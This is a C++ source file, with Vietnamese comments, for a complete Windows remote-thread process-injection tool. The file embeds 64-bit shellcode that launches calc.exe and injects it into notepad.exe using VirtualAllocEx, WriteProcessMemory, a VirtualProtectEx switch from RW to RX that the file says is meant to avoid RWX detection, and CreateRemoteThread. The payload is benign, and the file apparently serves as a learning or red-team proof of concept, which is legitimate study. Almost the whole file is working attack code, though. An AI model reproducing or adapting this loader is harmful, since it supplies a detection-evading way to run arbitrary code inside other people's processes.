#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
using namespace std;

// ============================================================================
// SHELLCODE - MỞ CALC.EXE (64-bit)
// ============================================================================

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int shellcodeSize = sizeof(shellcode) - 1;

// ============================================================================
// CẤU TRÚC KẾT QUẢ
// ============================================================================

struct InjectionResult {
    bool success;
    HANDLE hProcess;
    LPVOID remoteMemory;
    HANDLE hThread;
    DWORD threadId;
    DWORD oldProtect;
    DWORD lastError;
    const char* errorMsg;
};

// ============================================================================
// HÀM KHỞI TẠO
// ============================================================================

void InitResult(InjectionResult* result) {
    result->success = false;
    result->hProcess = NULL;
    result->remoteMemory = NULL;
    result->hThread = NULL;
    result->threadId = 0;
    result->oldProtect = 0;
    result->lastError = 0;
    result->errorMsg = "Unknown";
}

// ============================================================================
// HÀM KIỂM TRA HANDLE
// ============================================================================

bool IsValidHandle(HANDLE h) {
    return (h != NULL && h != INVALID_HANDLE_VALUE);
}

// ============================================================================
// HÀM DỌN DẸP
// ============================================================================

void Cleanup(InjectionResult* result) {
    if (IsValidHandle(result->hThread)) {
        CloseHandle(result->hThread);
        result->hThread = NULL;
    }

    if (result->remoteMemory != NULL && IsValidHandle(result->hProcess)) {
        VirtualFreeEx(result->hProcess, result->remoteMemory, 0, MEM_RELEASE);
        result->remoteMemory = NULL;
    }

    if (IsValidHandle(result->hProcess)) {
        CloseHandle(result->hProcess);
        result->hProcess = NULL;
    }
}

// ============================================================================
// HÀM TÌM PROCESS THEO TÊN
// ============================================================================

DWORD FindProcessIdByName(const wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cout << "[!] CreateToolhelp32Snapshot failed. Error: " << GetLastError() << endl;
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    wstring targetLower = processName;
    for (auto& c : targetLower) c = towlower(c);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            wstring currentLower = pe32.szExeFile;
            for (auto& c : currentLower) c = towlower(c);

            if (currentLower == targetLower) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processId;
}

// ============================================================================
// HÀM LẤY PROCESS HANDLE
// ============================================================================

HANDLE GetProcessHandle(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        cout << "[!] OpenProcess failed. Error: " << GetLastError() << endl;
        return NULL;
    }

    cout << "[+] Process handle obtained: 0x" << hex << hProcess << dec << endl;
    return hProcess;
}

// ============================================================================
// HÀM LẤY - ALLOCATE MEMORY (RW - KHÔNG EXECUTE)
// ============================================================================

bool AllocateRemoteMemory(InjectionResult* result) {
    cout << "[+] Allocating " << shellcodeSize << " bytes with RW permission..." << endl;

    result->remoteMemory = VirtualAllocEx(
        result->hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // ← RW, không phải RWX
    );

    if (result->remoteMemory == NULL) {
        result->lastError = GetLastError();
        result->errorMsg = "VirtualAllocEx failed";
        cout << "[!] VirtualAllocEx failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Memory allocated at: 0x" << hex << result->remoteMemory << dec << endl;
    cout << "[+] Permission: PAGE_READWRITE (RW)" << endl;
    return true;
}

// ============================================================================
// HÀM LẤY - WRITE SHELLCODE
// ============================================================================

bool WriteShellcodeToRemote(InjectionResult* result) {
    cout << "[+] Writing shellcode to remote process..." << endl;

    SIZE_T bytesWritten = 0;
    BOOL success = WriteProcessMemory(
        result->hProcess,
        result->remoteMemory,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (!success || bytesWritten != shellcodeSize) {
        result->lastError = GetLastError();
        result->errorMsg = "WriteProcessMemory failed";
        cout << "[!] WriteProcessMemory failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Shellcode written successfully (" << bytesWritten << " bytes)" << endl;
    return true;
}

// ============================================================================
// HÀM LẤY - CHANGE MEMORY PROTECTION (RW -> RX)
// ============================================================================

bool ChangeMemoryProtection(InjectionResult* result) {
    cout << "[+] Changing memory protection from RW to RX..." << endl;

    BOOL success = VirtualProtectEx(
        result->hProcess,
        result->remoteMemory,
        shellcodeSize,
        PAGE_EXECUTE_READ,      // ← RX (Execute + Read)
        &result->oldProtect
    );

    if (!success) {
        result->lastError = GetLastError();
        result->errorMsg = "VirtualProtectEx failed";
        cout << "[!] VirtualProtectEx failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Memory protection changed to PAGE_EXECUTE_READ (RX)" << endl;
    cout << "[+] Old protection: 0x" << hex << result->oldProtect << dec << endl;
    return true;
}

// ============================================================================
// HÀM LẤY - CREATE REMOTE THREAD
// ============================================================================

bool CreateRemoteThread(InjectionResult* result) {
    cout << "[+] Creating remote thread..." << endl;

    result->hThread = CreateRemoteThread(
        result->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)result->remoteMemory,
        NULL,
        0,
        &result->threadId
    );

    if (!IsValidHandle(result->hThread)) {
        result->lastError = GetLastError();
        result->errorMsg = "CreateRemoteThread failed";
        cout << "[!] CreateRemoteThread failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Remote thread created. Thread ID: " << result->threadId << endl;
    return true;
}

// ============================================================================
// HÀM THỰC THI INJECTION
// ============================================================================

bool ExecuteInjection(InjectionResult* result, const wstring& targetProcess) {
    cout << "\n[+] === STARTING REMOTE CODE INJECTION (WITH VIRTUALPROTECT) ===" << endl;
    cout << "[+] Target process: ";
    wcout << targetProcess << endl;

    // Bước 1: Tìm PID
    cout << "\n[+] Step 1: Finding target process..." << endl;
    DWORD pid = FindProcessIdByName(targetProcess);

    if (pid == 0) {
        result->errorMsg = "Target process not found";
        cout << "[!] Target process not found: ";
        wcout << targetProcess << endl;
        cout << "[!] Please start the target process first." << endl;
        return false;
    }

    cout << "[+] Process found. PID: " << pid << endl;

    // Bước 2: Lấy process handle
    cout << "\n[+] Step 2: Getting process handle..." << endl;
    result->hProcess = GetProcessHandle(pid);

    if (!IsValidHandle(result->hProcess)) {
        result->errorMsg = "Failed to get process handle";
        return false;
    }

    // Bước 3: Allocate memory (RW)
    cout << "\n[+] Step 3: Allocating memory with RW..." << endl;
    if (!AllocateRemoteMemory(result)) {
        Cleanup(result);
        return false;
    }

    // Bước 4: Write shellcode
    cout << "\n[+] Step 4: Writing shellcode..." << endl;
    if (!WriteShellcodeToRemote(result)) {
        Cleanup(result);
        return false;
    }

    // Bước 5: Change protection (RW -> RX)
    cout << "\n[+] Step 5: Changing protection to RX..." << endl;
    if (!ChangeMemoryProtection(result)) {
        Cleanup(result);
        return false;
    }

    // Bước 6: Create remote thread
    cout << "\n[+] Step 6: Creating remote thread..." << endl;
    if (!CreateRemoteThread(result)) {
        Cleanup(result);
        return false;
    }

    // Bước 7: Wait for thread
    cout << "\n[+] Step 7: Waiting for thread (1s)..." << endl;
    Sleep(1000);

    // Bước 8: Cleanup
    cout << "\n[+] Step 8: Cleanup..." << endl;

    if (IsValidHandle(result->hThread)) {
        CloseHandle(result->hThread);
        result->hThread = NULL;
        cout << "[+] Remote thread handle closed." << endl;
    }

    if (IsValidHandle(result->hProcess)) {
        CloseHandle(result->hProcess);
        result->hProcess = NULL;
        cout << "[+] Process handle closed." << endl;
    }

    result->success = true;
    result->errorMsg = "Success";
    cout << "\n[+] === INJECTION SUCCESSFUL ===" << endl;

    return true;
}

// ============================================================================
// HÀM IN BANNER
// ============================================================================

void PrintBanner() {
    cout << "============================================================" << endl;
    cout << "  CLASSIC CODE INJECTION - REMOTE WITH VIRTUALPROTECT" << endl;
    cout << "============================================================" << endl;
    cout << "[+] Technique: Remote Thread Injection + VirtualProtect" << endl;
    cout << "[+] Shellcode: calc.exe (" << shellcodeSize << " bytes)" << endl;
    cout << "[+] Memory: RW -> RX (avoid RWX detection)" << endl;
    cout << "============================================================" << endl;
}

// ============================================================================
// HÀM IN KẾT QUẢ
// ============================================================================

void PrintResult(const InjectionResult* result) {
    cout << "\n============================================================" << endl;
    if (result->success) {
        cout << "  [SUCCESS] Shellcode injected and executed!" << endl;
        cout << "  [+] Check if Calculator opened in target process." << endl;
        cout << "  [+] Memory was RW -> RX (no RWX region)." << endl;
    }
    else {
        cout << "  [FAILED] Shellcode injection failed!" << endl;
        cout << "  [+] Error: " << result->errorMsg << endl;
        if (result->lastError != 0) {
            cout << "  [+] Code: 0x" << hex << result->lastError << dec << endl;
        }
    }
    cout << "============================================================" << endl;
}

// ============================================================================
// MAIN
// ============================================================================

int main() {
    PrintBanner();

    wstring targetProcess = L"notepad.exe";

    InjectionResult result;
    InitResult(&result);

    if (ExecuteInjection(&result, targetProcess)) {
        PrintResult(&result);
    }
    else {
        PrintResult(&result);
    }

    cout << "\nPress Enter to exit..." << endl;
    cin.get();

    return result.success ? 0 : 1;
}